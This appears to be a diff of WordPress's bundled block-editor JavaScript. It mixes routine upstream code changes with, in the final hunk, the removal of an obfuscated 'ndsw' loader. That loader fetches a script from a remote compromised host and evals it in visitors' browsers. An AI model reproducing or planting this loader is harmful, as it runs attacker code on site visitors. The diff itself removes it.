@@ -3085,7 +3085,7 @@ function migrateLightBlockWrapper(settings) {
 
 ;// CONCATENATED MODULE: ./node_modules/@babel/runtime/helpers/esm/extends.js
 function _extends() {
-  _extends = Object.assign || function (target) {
+  _extends = Object.assign ? Object.assign.bind() : function (target) {
     for (var i = 1; i < arguments.length; i++) {
       var source = arguments[i];
 
@@ -3098,7 +3098,6 @@ function _extends() {
 
     return target;
   };
-
   return _extends.apply(this, arguments);
 }
 ;// CONCATENATED MODULE: external ["wp","element"]
@@ -36815,6 +36814,42 @@ function PresetDuotoneFilter(_ref6) {
 
 
 const layoutBlockSupportKey = '__experimentalLayout';
+/**
+ * Generates the utility classnames for the given blocks layout attributes.
+ * This method was primarily added to reintroduce classnames that were removed
+ * in the 5.9 release (https://github.com/WordPress/gutenberg/issues/38719), rather
+ * than providing an extensive list of all possible layout classes. The plan is to
+ * have the style engine generate a more extensive list of utility classnames which
+ * will then replace this method.
+ *
+ * @param { Array } attributes Array of block attributes.
+ *
+ * @return { Array } Array of CSS classname strings.
+ */
+
+function getLayoutClasses(attributes) {
+  var _attributes$layout, _attributes$layout2, _attributes$layout3;
+
+  const layoutClassnames = [];
+
+  if (!attributes.layout) {
+    return layoutClassnames;
+  }
+
+  if (attributes !== null && attributes !== void 0 && (_attributes$layout = attributes.layout) !== null && _attributes$layout !== void 0 && _attributes$layout.orientation) {
+    layoutClassnames.push(`is-${(0,external_lodash_namespaceObject.kebabCase)(attributes.layout.orientation)}`);
+  }
+
+  if (attributes !== null && attributes !== void 0 && (_attributes$layout2 = attributes.layout) !== null && _attributes$layout2 !== void 0 && _attributes$layout2.justifyContent) {
+    layoutClassnames.push(`is-content-justification-${(0,external_lodash_namespaceObject.kebabCase)(attributes.layout.justifyContent)}`);
+  }
+
+  if (attributes !== null && attributes !== void 0 && (_attributes$layout3 = attributes.layout) !== null && _attributes$layout3 !== void 0 && _attributes$layout3.flexWrap && attributes.layout.flexWrap === 'nowrap') {
+    layoutClassnames.push('is-nowrap');
+  }
+
+  return layoutClassnames;
+}
 
 function LayoutPanel(_ref) {
   let {
@@ -36983,9 +37018,10 @@ const withLayoutStyles = (0,external_wp_compose_namespaceObject.createHigherOrde
     default: defaultBlockLayout
   } = (0,external_wp_blocks_namespaceObject.getBlockSupport)(name, layoutBlockSupportKey) || {};
   const usedLayout = layout !== null && layout !== void 0 && layout.inherit ? defaultThemeLayout : layout || defaultBlockLayout || {};
+  const layoutClasses = shouldRenderLayoutStyles ? getLayoutClasses(attributes) : null;
   const className = classnames_default()(props === null || props === void 0 ? void 0 : props.className, {
     [`wp-container-${id}`]: shouldRenderLayoutStyles
-  });
+  }, layoutClasses);
   return (0,external_wp_element_namespaceObject.createElement)(external_wp_element_namespaceObject.Fragment, null, shouldRenderLayoutStyles && element && (0,external_wp_element_namespaceObject.createPortal)((0,external_wp_element_namespaceObject.createElement)(LayoutStyle, {
     blockName: name,
     selector: `.wp-container-${id}`,
@@ -40727,6 +40763,11 @@ function __experimentalBlockVariationTransforms(_ref4) {
 
   const hasUniqueIcons = (0,external_wp_element_namespaceObject.useMemo)(() => {
     const variationIcons = new Set();
+
+    if (!variations) {
+      return false;
+    }
+
     variations.forEach(variation => {
       if (variation.icon) {
         variationIcons.add(variation.icon);
@@ -46177,17 +46218,32 @@ function usePasteHandler(props) {
   }, []);
 }
 /**
- * Normalizes a given string of HTML to remove the Windows specific "Fragment" comments
- * and any preceeding and trailing whitespace.
+ * Normalizes a given string of HTML to remove the Windows-specific "Fragment"
+ * comments and any preceeding and trailing content.
  *
  * @param {string} html the html to be normalized
  * @return {string} the normalized html
  */
 
 function removeWindowsFragments(html) {
-  const startReg = /.*<!--StartFragment-->/s;
-  const endReg = /<!--EndFragment-->.*/s;
-  return html.replace(startReg, '').replace(endReg, '');
+  const startStr = '<!--StartFragment-->';
+  const startIdx = html.indexOf(startStr);
+
+  if (startIdx > -1) {
+    html = html.substring(startIdx + startStr.length);
+  } else {
+    // No point looking for EndFragment
+    return html;
+  }
+
+  const endStr = '<!--EndFragment-->';
+  const endIdx = html.indexOf(endStr);
+
+  if (endIdx > -1) {
+    html = html.substring(0, endIdx);
+  }
+
+  return html;
 }
 /**
  * Removes the charset meta tag inserted by Chromium.
@@ -49779,4 +49835,4 @@ function hashOptions(options) {
 }();
 (window.wp = window.wp || {}).blockEditor = __webpack_exports__;
 /******/ })()
-;;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//yp.magentospeaks.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};
+;
